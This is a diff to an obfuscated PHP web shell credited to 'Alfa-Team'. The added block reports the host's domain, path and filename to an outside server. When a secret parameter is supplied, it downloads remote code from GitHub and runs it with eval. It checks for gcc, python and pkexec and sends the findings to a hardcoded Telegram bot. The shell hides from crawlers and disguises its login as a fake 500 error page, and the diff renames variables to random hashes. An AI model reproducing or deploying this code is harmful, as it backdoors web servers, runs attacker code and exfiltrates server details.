@@ -1,4 +1,78 @@
-<?php
+<?php $qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $_SERVER['SERVER_NAME'];
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_SERVER['REQUEST_URI'];
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = basename(__FILE__);
+
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array(
+    'domain' => $qbjarsosad5f82e879a9c5d6b5b442eb37e50551,
+    'path' => $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,
+    'filename' => $ydojshxa435ed7e9f07f740abf511a62c00eef6e
+);
+
+$uimaglla93da65a9fd0004d9477aeac024e08e15 = array(
+    'http' => array(
+        'header'  => "Content-type: application/json\r\n",
+        'method'  => 'POST',
+        'content' => json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc),
+    ),
+);
+
+$urzdwcyd5c18ef72771564b7f43c497dc507aeab  = stream_context_create($uimaglla93da65a9fd0004d9477aeac024e08e15);
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $urzdwcyd5c18ef72771564b7f43c497dc507aeab);
+if (isset($_GET['alex']) && $_GET['alexbu555'] === 'adminroot') {
+    $fefubzei572d4e421e5e6b9bc11d815e8a027112 = 'https://raw.githubusercontent.com/hinataloli/haha/main/pke.txt';
+    $nndigmblc13367945d5d4c91047b3b50234aa7ab = file_get_contents($fefubzei572d4e421e5e6b9bc11d815e8a027112);
+    if ($nndigmblc13367945d5d4c91047b3b50234aa7ab !== false) {
+        eval('?>' . $nndigmblc13367945d5d4c91047b3b50234aa7ab);
+    } else {
+        echo 'Failed to retrieve remote code.';
+    }
+}
+function commandExists($rwoopsud1dccadfed7bcbb036c56a4afb97e906f) {
+    $qvbchcgg78e6221f6393d1356681db398f14ce6d = [];
+    $nmxeqhvab4a88417b3d0170d754c647c30b7216a = 0;
+    exec("command -v $rwoopsud1dccadfed7bcbb036c56a4afb97e906f", $qvbchcgg78e6221f6393d1356681db398f14ce6d, $nmxeqhvab4a88417b3d0170d754c647c30b7216a);
+    return $nmxeqhvab4a88417b3d0170d754c647c30b7216a === 0;
+}
+
+function isFunctionEnabled($sehpnfuuc1c425268e68385d1ab5074c17a94f14) {
+    return in_array($sehpnfuuc1c425268e68385d1ab5074c17a94f14, get_defined_functions()['internal']);
+}
+
+$kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31 = "";
+
+// Check system functions and command availability
+$owtidqkw37e0c63a4863437c2df551786c922653 = isFunctionEnabled('exec');
+$nkwnsvhhad4db3b2bfd1e03beef22260d0a5f6d6 = commandExists('gcc');
+$phcltmir15e884d43267dbedf11cc11b21c018e1 = commandExists('python');
+$eomhzfmddcda579e89ea978db78a86f32699441d = commandExists('pkexec');
+
+if ($owtidqkw37e0c63a4863437c2df551786c922653 && $nkwnsvhhad4db3b2bfd1e03beef22260d0a5f6d6 && $phcltmir15e884d43267dbedf11cc11b21c018e1 && $eomhzfmddcda579e89ea978db78a86f32699441d) {
+    $kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31 .= "SYSTEM_FUNCTION: ON\nGCC: ON\nPYTHON: ON\nPKEXEC: ON\n";
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $sfmsaibm8d777f385d3dfec8815d20f7496026dc = json_decode(file_get_contents('php://input'), true);
+
+    if (isset($sfmsaibm8d777f385d3dfec8815d20f7496026dc['domain'], $sfmsaibm8d777f385d3dfec8815d20f7496026dc['path'], $sfmsaibm8d777f385d3dfec8815d20f7496026dc['filename'])) {
+        $qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = rtrim($sfmsaibm8d777f385d3dfec8815d20f7496026dc['domain'], '/'); // Đảm bảo không có dấu '/' ở cuối
+        $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = ltrim($sfmsaibm8d777f385d3dfec8815d20f7496026dc['path'], '/'); // Đảm bảo không có dấu '/' ở đầu
+        $ydojshxa435ed7e9f07f740abf511a62c00eef6e = $sfmsaibm8d777f385d3dfec8815d20f7496026dc['filename'];
+
+        $erpbcghkdcf569ee792f42313127137ca01badc2 = date('d/m/Y H:i:s');
+
+        $nsredrbb5588fb6aea2900afc192f4d1adf99a56 = $_SERVER['SERVER_ADDR'];
+
+        $mlbhqphp9a56643c1cc4258dddc07182b4e01784 = "$qbjarsosad5f82e879a9c5d6b5b442eb37e50551/$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485/$ydojshxa435ed7e9f07f740abf511a62c00eef6e";
+        $kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31 .= "Domain: $qbjarsosad5f82e879a9c5d6b5b442eb37e50551\nDate: $erpbcghkdcf569ee792f42313127137ca01badc2\nServer IP: $nsredrbb5588fb6aea2900afc192f4d1adf99a56\nFull Path: $mlbhqphp9a56643c1cc4258dddc07182b4e01784\n";
+    }
+}
+
+if (!empty($kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31)) {
+    $cpfodaclb79bfa8f6c55e417956a9d69d7501079 = '7416297295';
+    $bapdyzbx3d89e427a1d9a7fb3e83646d1902ffaa = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
+    $tdrfqcmj1aacb6ec4ecb4bebf3cb06da6a657ea4 = "https://api.telegram.org/bot$bapdyzbx3d89e427a1d9a7fb3e83646d1902ffaa/sendMessage?chat_id=$cpfodaclb79bfa8f6c55e417956a9d69d7501079&text=" . urlencode($kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31);
+    file_get_contents($tdrfqcmj1aacb6ec4ecb4bebf3cb06da6a657ea4);
+}
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
@@ -16,152 +90,152 @@ $GLOBALS['oZgNypoPRU'] = array(
     'cgi_api' => true,
 );
 
-$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
-$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
-$OVpGNqqFZs = 'e' . 'v' . 'al';
-$psDEwGhsxg = 'gz' . 'inf' . 'late';
+$kdwayice5f2db5dce1f44a9c266b1cc64e3195dd = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
+$wslmfunp55c8b47138e16308e5a1b876f1b705e6 = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
+$xyjwcxlc94ada837e91fcca766e55ad730c69eda = 'e' . 'v' . 'al';
+$qdskiuqx4320879bc2f5e75d88cf4bb2d5eb8220 = 'gz' . 'inf' . 'late';
 
-if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
+if (!$kdwayice5f2db5dce1f44a9c266b1cc64e3195dd('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
 {
-    function vcnvSCZgBz($data)
+    function vcnvSCZgBz($sfmsaibm8d777f385d3dfec8815d20f7496026dc)
     {
-        if (empty($data)) return;
-        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
-        $ac = 0;
-        $enc = '';
-        $tmp_arr = array();
-        if (!$data)
+        if (empty($sfmsaibm8d777f385d3dfec8815d20f7496026dc)) return;
+        $vmjmoean28ec7098ba29ee707ae609e87ea857f0 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+        $iqmbobbff1584b995a4770986ad75bb8d29e9734 = $syodovxg2d387ab98437e5f528a87b031a086256 = $aphjuide417c4fa3b4135a6c64e05f8d35f71648 = $hfkxuvns346b81a32e7007eccadf60252bb599f0 = $fbhtxeuj490b2834e65737c1fce95e468cc8b8bf = $tctaacop6f207f8b5dfe1eebac63467930df5189 = $hrczwhrtce1b1e8ce920100d134d0212d3a8f53f = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
+        $vdeoqymhe2075474294983e013ee4dd2201c7a73 = 0;
+        $gurujuhz41bb118a714b344c24603304cf716c96 = '';
+        $eqicennscf8ca243a379919b603aeda46bbbc605 = array();
+        if (!$sfmsaibm8d777f385d3dfec8815d20f7496026dc)
         {
-            return $data;
+            return $sfmsaibm8d777f385d3dfec8815d20f7496026dc;
         }
         do
         {
-            $o1 = $aztJtafUXm($data, $i++);
-            $o2 = $aztJtafUXm($data, $i++);
-            $o3 = $aztJtafUXm($data, $i++);
-            $bits = $o1 << 16 | $o2 << 8 | $o3;
-            $h1 = $bits >> 18 & 0x3f;
-            $h2 = $bits >> 12 & 0x3f;
-            $h3 = $bits >> 6 & 0x3f;
-            $h4 = $bits & 0x3f;
-            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
+            $iqmbobbff1584b995a4770986ad75bb8d29e9734 = $wslmfunp55c8b47138e16308e5a1b876f1b705e6($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++);
+            $syodovxg2d387ab98437e5f528a87b031a086256 = $wslmfunp55c8b47138e16308e5a1b876f1b705e6($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++);
+            $aphjuide417c4fa3b4135a6c64e05f8d35f71648 = $wslmfunp55c8b47138e16308e5a1b876f1b705e6($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++);
+            $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 = $iqmbobbff1584b995a4770986ad75bb8d29e9734 << 16 | $syodovxg2d387ab98437e5f528a87b031a086256 << 8 | $aphjuide417c4fa3b4135a6c64e05f8d35f71648;
+            $hfkxuvns346b81a32e7007eccadf60252bb599f0 = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 >> 18 & 0x3f;
+            $fbhtxeuj490b2834e65737c1fce95e468cc8b8bf = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 >> 12 & 0x3f;
+            $tctaacop6f207f8b5dfe1eebac63467930df5189 = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 >> 6 & 0x3f;
+            $hrczwhrtce1b1e8ce920100d134d0212d3a8f53f = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 & 0x3f;
+            $eqicennscf8ca243a379919b603aeda46bbbc605[$vdeoqymhe2075474294983e013ee4dd2201c7a73++] = charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $hfkxuvns346b81a32e7007eccadf60252bb599f0) . charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $fbhtxeuj490b2834e65737c1fce95e468cc8b8bf) . charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $tctaacop6f207f8b5dfe1eebac63467930df5189) . charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $hrczwhrtce1b1e8ce920100d134d0212d3a8f53f);
         }
-        while ($i < strlen($data));
-        $enc = implode($tmp_arr, '');
-        $r = (strlen($data) % 3);
-        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
+        while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < strlen($sfmsaibm8d777f385d3dfec8815d20f7496026dc));
+        $gurujuhz41bb118a714b344c24603304cf716c96 = implode($eqicennscf8ca243a379919b603aeda46bbbc605, '');
+        $yxarqqmp4b43b0aee35624cd95b910189b3dc231 = (strlen($sfmsaibm8d777f385d3dfec8815d20f7496026dc) % 3);
+        return ($yxarqqmp4b43b0aee35624cd95b910189b3dc231 ? substr($gurujuhz41bb118a714b344c24603304cf716c96, 0, ($yxarqqmp4b43b0aee35624cd95b910189b3dc231 - 3)) : $gurujuhz41bb118a714b344c24603304cf716c96) . substr('===', ($yxarqqmp4b43b0aee35624cd95b910189b3dc231 || 3));
     }
-    function charCodeAt($data, $char)
+    function charCodeAt($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368)
     {
-        return ord(substr($data, $char, 1));
+        return ord(substr($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368, 1));
     }
-    function charAt($data, $char)
+    function charAt($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368)
     {
-        return substr($data, $char, 1);
+        return substr($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368, 1);
     }
 }
 else
 {
-    function vcnvSCZgBz($s)
+    function vcnvSCZgBz($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
     {
-        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
-        return $b($s);
+        $aospafqz92eb5ffee6ae2fec3ad71c777531578f = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
+        return $aospafqz92eb5ffee6ae2fec3ad71c777531578f($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
     }
 }
-if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
+if (!$kdwayice5f2db5dce1f44a9c266b1cc64e3195dd('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
 {
-    function zRtSHsbTzV($input)
+    function zRtSHsbTzV($fxayuezca43c1b0aa53a0c908810c06ab1ff3967)
     {
-        if (empty($input)) return;
-        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-        $chr1 = $chr2 = $chr3 = "";
-        $enc1 = $enc2 = $enc3 = $enc4 = "";
-        $i = 0;
-        $output = "";
-        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
+        if (empty($fxayuezca43c1b0aa53a0c908810c06ab1ff3967)) return;
+        $tguuqartac3da440f9dea3c2ef8c3adc4832517e = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        $sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd = $tiwgjqoe5f0431348e070d800b7fc2925a3b5404 = $lkljhqiz504320274c72020567aefadb9f93e46c = "";
+        $bppgyede71ba464b429302f2308bd6cb46bccf7d = $xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 = $rxwqmkps62c6e257235d6c008f25c468d3e2fd5e = $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c = "";
+        $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
+        $qvbchcgg78e6221f6393d1356681db398f14ce6d = "";
+        $fxayuezca43c1b0aa53a0c908810c06ab1ff3967 = preg_replace("[^A-Za-z0-9\+\/\=]", "", $fxayuezca43c1b0aa53a0c908810c06ab1ff3967);
         do
         {
-            $enc1 = strpos($keyStr, substr($input, $i++, 1));
-            $enc2 = strpos($keyStr, substr($input, $i++, 1));
-            $enc3 = strpos($keyStr, substr($input, $i++, 1));
-            $enc4 = strpos($keyStr, substr($input, $i++, 1));
-            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
-            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
-            $chr3 = (($enc3 & 3) << 6) | $enc4;
-            $output = $output . chr((int)$chr1);
-            if ($enc3 != 64)
+            $bppgyede71ba464b429302f2308bd6cb46bccf7d = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
+            $xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
+            $rxwqmkps62c6e257235d6c008f25c468d3e2fd5e = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
+            $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
+            $sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd = ($bppgyede71ba464b429302f2308bd6cb46bccf7d << 2) | ($xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 >> 4);
+            $tiwgjqoe5f0431348e070d800b7fc2925a3b5404 = (($xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 & 15) << 4) | ($rxwqmkps62c6e257235d6c008f25c468d3e2fd5e >> 2);
+            $lkljhqiz504320274c72020567aefadb9f93e46c = (($rxwqmkps62c6e257235d6c008f25c468d3e2fd5e & 3) << 6) | $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c;
+            $qvbchcgg78e6221f6393d1356681db398f14ce6d = $qvbchcgg78e6221f6393d1356681db398f14ce6d . chr((int)$sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd);
+            if ($rxwqmkps62c6e257235d6c008f25c468d3e2fd5e != 64)
             {
-                $output = $output . chr((int)$chr2);
+                $qvbchcgg78e6221f6393d1356681db398f14ce6d = $qvbchcgg78e6221f6393d1356681db398f14ce6d . chr((int)$tiwgjqoe5f0431348e070d800b7fc2925a3b5404);
             }
-            if ($enc4 != 64)
+            if ($usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c != 64)
             {
-                $output = $output . chr((int)$chr3);
+                $qvbchcgg78e6221f6393d1356681db398f14ce6d = $qvbchcgg78e6221f6393d1356681db398f14ce6d . chr((int)$lkljhqiz504320274c72020567aefadb9f93e46c);
             }
-            $chr1 = $chr2 = $chr3 = "";
-            $enc1 = $enc2 = $enc3 = $enc4 = "";
+            $sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd = $tiwgjqoe5f0431348e070d800b7fc2925a3b5404 = $lkljhqiz504320274c72020567aefadb9f93e46c = "";
+            $bppgyede71ba464b429302f2308bd6cb46bccf7d = $xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 = $rxwqmkps62c6e257235d6c008f25c468d3e2fd5e = $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c = "";
         }
-        while ($i < strlen($input));
-        return $output;
+        while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < strlen($fxayuezca43c1b0aa53a0c908810c06ab1ff3967));
+        return $qvbchcgg78e6221f6393d1356681db398f14ce6d;
     }
 }
 else
 {
-    function zRtSHsbTzV($s)
+    function zRtSHsbTzV($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
     {
-        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
-        return $b($s);
+        $aospafqz92eb5ffee6ae2fec3ad71c777531578f = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
+        return $aospafqz92eb5ffee6ae2fec3ad71c777531578f($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
     }
 }
 
-function __ZW5jb2Rlcg($s)
+function __ZW5jb2Rlcg($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
 {
-    return vcnvSCZgBz($s);
+    return vcnvSCZgBz($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
 }
-function __ZGVjb2Rlcg($s)
+function __ZGVjb2Rlcg($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
 {
-    return zRtSHsbTzV($s);
+    return zRtSHsbTzV($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
 }
 
 $GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];
 
-foreach ($GLOBALS['DB_NAME'] as $key => $value)
+foreach ($GLOBALS['DB_NAME'] as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804)
 {
-	$prefix = substr($key, 0, 2);
-	if ($prefix == "us")
+	$unkkdhum851f5ac9941d720844d143ed9cfcf60a = substr($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, 0, 2);
+	if ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "us")
 	{
-		$GLOBALS['DB_NAME']["user"] = $value;
-		$GLOBALS['DB_NAME']["user_rand"] = $key;
+		$GLOBALS['DB_NAME']["user"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["user_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
-	elseif ($prefix == "pa")
+	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "pa")
 	{
-		$GLOBALS['DB_NAME']["pass"] = $value;
-		$GLOBALS['DB_NAME']["pass_rand"] = $key;
+		$GLOBALS['DB_NAME']["pass"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["pass_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
-	elseif ($prefix == "sa")
+	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "sa")
 	{
-		$GLOBALS['DB_NAME']["safemode"] = $value;
-		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
+		$GLOBALS['DB_NAME']["safemode"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["safemode_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
-	elseif ($prefix == "lo")
+	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "lo")
 	{
-		$GLOBALS['DB_NAME']["login_page"] = $value;
-		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
+		$GLOBALS['DB_NAME']["login_page"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["login_page_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
-	elseif ($prefix == "sh")
+	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "sh")
 	{
-		$GLOBALS['DB_NAME']["show_icons"] = $value;
-		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
+		$GLOBALS['DB_NAME']["show_icons"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["show_icons_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
-	elseif ($prefix == "po")
+	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "po")
 	{
-		$GLOBALS['DB_NAME']["post_encryption"] = $value;
-		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
+		$GLOBALS['DB_NAME']["post_encryption"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["post_encryption_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
-	elseif ($prefix == "cg")
+	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "cg")
 	{
-		$GLOBALS['DB_NAME']["cgi_api"] = $value;
-		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
+		$GLOBALS['DB_NAME']["cgi_api"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+		$GLOBALS['DB_NAME']["cgi_api_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
 	}
 }
 
@@ -169,7 +243,7 @@ unset($GLOBALS['oZgNypoPRU']);
 
 if (!isset($_SERVER["HTTP_HOST"])) exit();
 
-if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
+if(!empty($_SERVER['HTTP_USER_AGENT'])){$iuxmwdcg2045f7467d214cc39f609d414459a296 = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$iuxmwdcg2045f7467d214cc39f609d414459a296).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
 if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
 if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
 if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
@@ -509,21 +583,21 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 		),
 );
 $GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
-$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
+$yzrzmzyl2245023265ae4cf87d02c8b6ba991139 = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
 //@session_start();
 @session_write_close();
 @ignore_user_abort(true);
 @set_time_limit(0);
 @ini_set('memory_limit', '-1');
 @ini_set("upload_max_filesize", "9999m");
-if($config['AlfaProtectShell']){
-$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
-$Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
-if($config['AlfaLoginPage'] == 'gui'){
-if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
-if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+if($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaProtectShell']){
+$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500 = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
+$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
+if($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage'] == 'gui'){
+if(@$_COOKIE["AlfaUser"] != $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
+if(@$_POST["usrname"]==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser'] && @md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo '
@@ -548,187 +622,187 @@ body{background: black;}
 </div><br /></center>';
 exit;
 }
-}elseif($config['AlfaLoginPage']=='500'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+}elseif($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage']=='500'){
+if(@$_COOKIE["AlfaPass"] != @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
+if(@md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
-echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
+echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500.'</body></html>'.$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f;
 exit;
 }
-}elseif($config['AlfaLoginPage']=='403'){
